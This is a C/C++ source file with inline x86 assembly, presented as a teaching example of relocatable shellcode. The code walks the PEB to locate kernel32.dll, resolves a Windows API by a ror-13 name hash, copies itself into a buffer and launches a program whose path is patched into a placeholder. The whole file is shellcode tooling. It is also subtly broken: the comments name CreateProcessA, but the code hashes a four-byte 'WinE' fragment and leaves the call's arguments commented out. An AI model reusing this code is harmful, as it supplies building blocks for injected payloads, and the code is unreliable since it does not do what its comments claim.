//==============================================================================
// Title : Example of a relocatable shellcode
// Author : South
// Date : 2017.5.2
// Description :
// This source code show you that how we manipulate the text section and
// some techniques for inline assembly language
// There are a lot of things to be improved, find and fix them.
//==============================================================================

#include <windows.h>
#include <stdio.h>

// This global variable defined in main.cc
extern char* gTARGET_PROG_PATH;
extern ULONG gTARGET_PROG_LEN;

void MoveShellCode(PVOID ShellCodeBuf) {
    __asm
    {
        call CopyShellCode
        pushad
        mov ebp, esp
        sub esp, 0x54
        //[ebp - 0x48]: StartUpInfo, ProcessInfo
        //[ebp - 0x4C]: Target address
        //[ebp - 0x50]: CreateProcessA function address
        //[ebp - 0x54]: kernel32.dll base address of kernel32.dll handle

        //Init Local Memory
        mov ecx, 0x54
        INIT_MEMORY:
        dec ecx
            mov BYTE PTR[esp + ecx], 0x0
            test ecx, ecx
            jnz INIT_MEMORY

            jmp GET_TARGET_PROG
            CREATE_TARGET_PROC :
        pop eax
            mov DWORD PTR[ebp - 0x4C], eax
            call Find_Kernel32
            mov DWORD PTR[ebp - 0x54], eax //Save PE Base address

            //push 0x4173 //As
            //push 0x7365636f //seco
            //push 0x72506574 //rPet
            //push 0x61657243 //aerC



            //push 0x61657243 // "aerC"
            //push 0x72506574 // "rPet" 
            //push 0x7365636f // "seco"
            //push 0x4173 //"as"

            push 0x456E6957 // "EniW"

            // 문자열에 대한 해시 계산 
            mov esi, esp
            call Compute_Hash
            add esp, 0x4


            // 함수 주소 찾기 
            push edi//CreateProcessA Hash Value
            push DWORD PTR[ebp - 0x54]//PE Base address
            call Find_Function
            mov DWORD PTR[ebp - 0x50], edx //CreateProcessA address

            mov DWORD PTR[ebp - 0x48], 0x44 //StartupInfo cb
            lea eax, [ebp - 0x48]  //eax: StartupInfo addr
            //push eax //pProcessInfo
            //push eax //pStartupInfo
            //push 0x0 //starting directory
            //push 0x0 //Environment block
            //push 0x0 //Create flags
            //push 0x0 //bInherit Handle
            //push 0x0 //lpThreadAttribute
            //push 0x0 //lpProcessAttribute
            //push DWORD PTR [ebp-0x4C] //lpCommandLine
            //push 0x0 //lpApplicationName



            call DWORD PTR[ebp - 0x50] //call CreateProcessA
            add esp, 0x54
            popad
            retn 0x4
            GET_TARGET_PROG:
        call CREATE_TARGET_PROC
            TARGET_PROG : //40bytes
        __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            __emit 0xCC
            //===============================
            // parameter : None
            // return : eax
        Find_Kernel32:
        push esi
            push ebp
            xor eax, eax
            //fs[0x30] : PEB addr
            //esi+0xC : Ldr addr
            //esi+0x1c : InInitializationOrderModuleList addr
            mov esi, fs: [0x30]
            mov esi, [esi + 0xC]
            mov esi, [esi + 0x14]
            NEXT_MODULE :
            //InInitializationOrderModuleList addr + 0x8 = DllBase
            //InInitializationOrderModuleList addr + 0x20 =
            //_LDR_DATA_TABLE_ENTRY.BaseDllName(_UNICODE_STRING).Buffer
            mov ebp, [esi + 0x10]
            mov edi, [esi + 0x20]
            mov esi, [esi]
            //Unicode String : One char : 2 Bytes
            //'k', 0, 'e', 0, 'r', 0, 'n', 0,
            //'e', 0, 'l', 0, '3', 0, '2', 0,
            //'d', 0, 'l', 0, 'l', 0, 0, 0
            cmp BYTE PTR DS : [edi + 0x18] , al
            jne NEXT_MODULE
            cmp BYTE PTR DS : [edi] , 0x6B
            je FIND_KERNEL32_FINISHED
            cmp BYTE PTR DS : [edi] , 0x4B
            je FIND_KERNEL32_FINISHED
            jmp NEXT_MODULE
            FIND_KERNEL32_FINISHED :
        mov eax, ebp
            pop ebp
            pop esi
            ret
            //===============================
            // parameter: esi
            // return: edi
        Compute_Hash:
        xor edi, edi
            xor eax, eax
            // clear DF register
            // the index of string will be increase
            cld
            COMPUTE_HASH_AGAIN :
        // load one byte from src to dest
        // src : esi, dest: eax
        lodsb
            test al, al
            jz COMPUTE_HASH_FINISHED
            ror edi, 0dh
            add edi, eax
            jmp COMPUTE_HASH_AGAIN
            COMPUTE_HASH_FINISHED :
        ret
            //===============================
            //parameters
            // 1st : kernel32.dll base addr
            // 2nd : target function hash
            //return : edx
        Find_Function:
        pushad
            //esp+0x24 : kernel32.dll base addr
            //ebp+0x3C : PE file structure offset
            //ebp+eax+0x78 : IMAGE_DATA_DIRECTORY ARRAY[0].VirtualAddress
            //In the case of DLL 1st ARRAY is the Export Table Information
            mov ebp, [esp + 0x24]
            mov eax, [ebp + 0x3C]
            mov edx, [ebp + eax + 0x78]

            //edx : start VritualAddress of Export Table
            //edx+0x18 : NumberOfNames
            //edx+0x20 : AddressOfNames
            add edx, ebp
            xor ecx, ecx
            mov ecx, [edx + 0x18]
            mov ebx, [edx + 0x20]
            push ecx
            //ebx : addr of Export Function Name Table
            add ebx, ebp
            pop ecx
            FIND_FUNCTION_LOOP :
        jecxz FIND_FUNCTION_FINISHED
            dec ecx
            //esi : 1st function name RVA
            //esi : addr of 1st function name
            mov esi, [ebx + ecx * 4]
            add esi, ebp
            call Compute_Hash
            FIND_FUNCTION_COMPARE :
        cmp edi, [esp + 0x28]
            jnz FIND_FUNCTION_LOOP
            //ebx : RVA of AddressOfOrdinals
            //ebx : addr of AddressOfOrdinals
            mov ebx, [edx + 0x24]
            add ebx, ebp
            //cx : Target functions Oridnal Value
            mov cx, [ebx + 2 * ecx]

            //ebx : RVA of AddressOfFunctions
            //ebx : addr of AddressOfFunctions
            //eax : addr of target function
            mov ebx, [edx + 0x1C]
            add ebx, ebp
            mov eax, [ebx + 4 * ecx]
            add eax, ebp
            mov[esp + 0x14], eax
            FIND_FUNCTION_FINISHED :
        // rst -> edx : [esp+0x14]
        popad
            retn 8
            //===============================
            CopyShellCode :
            pop esi
            mov eax, esi
            mov edi, ShellCodeBuf
            lea ecx, CopyShellCode
            sub ecx, esi
            cld
            rep movsb

            mov ebx, TARGET_PROG
            sub ebx, eax

            mov esi, gTARGET_PROG_PATH
            mov edi, ShellCodeBuf
            add edi, ebx
            mov ecx, gTARGET_PROG_LEN
            rep movsb
    }
    return;
}//end of MoveShellCode
